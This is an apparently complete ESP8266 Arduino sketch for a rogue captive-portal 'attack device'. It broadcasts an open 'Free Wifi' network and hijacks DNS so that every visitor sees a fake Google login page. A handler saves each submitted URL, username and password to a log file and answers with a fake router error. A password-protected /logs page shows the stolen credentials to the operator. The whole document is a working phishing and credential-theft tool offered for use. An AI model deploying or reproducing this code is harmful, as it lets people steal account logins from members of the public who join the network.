#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include "google.h"
#include "facebook.h"
#include "udc.h"

// Incluir las bibliotecas de Crypto y SHA256
#include <Crypto.h>
#include <SHA256.h>
#define SHA256_SIZE 32 
#define LOGFILE "/log.txt"

const char *ssid = "Free Wifi";

#define captivePortalPage GOOGLE_HTML

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String webString = "";
String serialString = "";

const char* hashed_password = "6bceb6d53d51a11c3bde77e8cafe1f152782c5e52a13e514da12a9e35b0c2bcb"; 
const char* salt = "somesalt"; 

// Función para calcular el hash SHA256
String calculateHash(const char* input, const char* salt) {
    String salted_input = String(input) + String(salt);
    uint8_t hash[SHA256_SIZE]; // Array para almacenar el hash resultante

    SHA256 sha256; // Crear un objeto SHA256
    sha256.reset(); // Reiniciar el objeto SHA256
    sha256.update((const uint8_t*)salted_input.c_str(), salted_input.length()); // Añadir la entrada al hash
    sha256.finalize(hash, SHA256_SIZE); // Finalizar el cálculo del hash

    // Convertir el hash a una cadena hexadecimal
    String hashStr = "";
    for (int i = 0; i < SHA256_SIZE; i++) {
        char buf[3];
        sprintf(buf, "%02x", hash[i]); // Formato hexadecimal de 2 dígitos
        hashStr += buf;
    }

    return hashStr;
}

// Función para verificar la contraseña
bool checkPassword(const char* input_password) {
    String input_hash = calculateHash(input_password, salt);
    return input_hash == hashed_password;
}

void blink(int n) {
  for (int i = 0; i < n; i++) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(250);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(250);
  }
}

void setup() {
  Serial.begin(9600);
  Serial.println();
  Serial.println("V2.0.0 - Rouge Captive Portal Attack Device");
  Serial.println();

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  Serial.print("Initializing File System...");
  SPIFFS.begin();
  Serial.println(" Success!");
  Serial.print("Checking for log.txt file...");
  File f = SPIFFS.open(LOGFILE, "r");

  if (!f) {
    Serial.print(" File doesn't exist yet. \nFormatting and creating it...");
    SPIFFS.format();
    File f = SPIFFS.open(LOGFILE, "w");
    if (!f) {
      Serial.println("File F failed!");
    }
    f.println("Captured Login Credentials:");
  }
  f.close();
  Serial.println(" Success!");

  Serial.print("Creating Access Point...");
  WiFi.setOutputPower(20.5);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);
  delay(500);
  Serial.println(" Success!");

  Serial.print("Starting DNS Server...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(" Success!");

  webServer.on("/", handleRoot);
  webServer.on("/generate_204", handleRoot);
  webServer.on("/fwlink", handleRoot);
  webServer.onNotFound(handleRoot);

  webServer.on("/validate", []() {
    String url = webServer.arg("url");
    String user = webServer.arg("user");
    String pass = webServer.arg("pass");

    serialString = user + ":" + pass;
    Serial.println(serialString);

    File f = SPIFFS.open(LOGFILE, "a");
    f.print(url);
    f.print(":");
    f.print(user);
    f.print(":");
    f.println(pass);
    f.close();

    webString = "<h1>#E701 - Router Configuration Error</h1>";
    webServer.send(500, "text/html", webString);

    serialString = "";
    webString = "";

    blink(5);
  });

  // Proteger la ruta /logs con verificación de contraseña
  webServer.on("/logs", []() {
    // Verificar si se ha enviado una contraseña
    if (webServer.hasArg("password")) {
      String password = webServer.arg("password");
      if (checkPassword(password.c_str())) {
        // Contraseña correcta, mostrar los logs
        webString = "<html><body><h1>Captured Logs</h1><br><pre>";
        File f = SPIFFS.open(LOGFILE, "r");
        serialString = f.readString();
        webString += serialString;
        f.close();
        webString += "</pre><br><a href='/logs/clear'>Clear all logs</a></body></html>";
        webServer.send(200, "text/html", webString);
        Serial.println(serialString);
        serialString = "";
        webString = "";
      } else {
        // Contraseña incorrecta, mostrar un mensaje de error
        webString = "<html><body><h1>Invalid password</h1><br><a href='/logs'>Try again</a></body></html>";
        webServer.send(401, "text/html", webString);
      }
    } else {
      // Mostrar el formulario para ingresar la contraseña
      webString = "<html><body><h1>Enter password</h1><form action='/logs' method='POST'><input type='password' name='password'><input type='submit' value='Submit'></form></body></html>";
      webServer.send(200, "text/html", webString);
    }
  });

  webServer.on("/logs/clear", []() {
    // Verificar si se ha enviado una contraseña
    if (webServer.hasArg("password")) {
      String password = webServer.arg("password");
      if (checkPassword(password.c_str())) {
        // Contraseña correcta, borrar los logs
        webString = "<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
        File f = SPIFFS.open(LOGFILE, "w");
        f.println("Captured Login Credentials:");
        f.close();
        webServer.send(200, "text/html", webString);
        Serial.println(serialString);
        serialString = "";
        webString = "";
      } else {
        // Contraseña incorrecta, mostrar un mensaje de error
        webString = "<html><body><h1>Invalid password</h1><br><a href='/logs/clear'>Try again</a></body></html>";
        webServer.send(401, "text/html", webString);
      }
    } else {
      // Mostrar el formulario para ingresar la contraseña
      webString = "<html><body><h1>Enter password</h1><form action='/logs/clear' method='POST'><input type='password' name='password'><input type='submit' value='Submit'></form></body></html>";
      webServer.send(200, "text/html", webString);
    }
  });

  Serial.print("Starting Web Server...");
  webServer.begin();
  Serial.println(" Success!");

  blink(10);

  Serial.println("Device Ready!");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot() {
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");

  webServer.send(200, "text/html", captivePortalPage);
}
